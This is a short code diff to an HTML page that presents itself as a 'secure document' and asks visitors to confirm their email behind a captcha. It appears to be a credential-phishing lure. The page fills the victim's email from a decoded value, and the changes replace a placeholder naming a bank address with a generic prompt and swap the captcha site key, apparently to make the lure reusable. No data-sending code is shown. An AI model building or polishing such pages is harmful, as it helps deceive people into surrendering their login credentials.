@@ -191,11 +191,11 @@
         <p><strong>You've received a secure document</strong></p>
         <p2>To open this secure document, we'll need to verify the intended recipient's email. Please enter the email address to which this item was shared.</p2>
         
-        <input type="email" id="email-input" placeholder="gary@chase.com" required>
+        <input type="email" id="email-input" placeholder="Enter Email" required>
         
         <!-- CAPTCHA Section -->
         <div class="captcha-header">Let us know you are human</div>
-        <div class="cf-turnstile" data-sitekey="0x4AAAAAAABtnIag8Vrg39nD" data-callback="captchaSuccess" data-expired-callback="captchaExpired"></div>
+        <div class="cf-turnstile" data-sitekey="0x4AAAAAACaHNXiIB3vMTh35" data-callback="captchaSuccess" data-expired-callback="captchaExpired"></div>
         
         <!-- Success Message (Hidden by default) -->
         <div class="success-message" id="success-message">Success!</div>
@@ -431,7 +431,7 @@
                 document.getElementById('email-input').value = decodedEmail;
             } else {
                 // Set placeholder example
-                document.getElementById('email-input').placeholder = "gary@chase.com";
+                document.getElementById('email-input').placeholder = "Enter Email";
             }
             
             // Set up event listeners
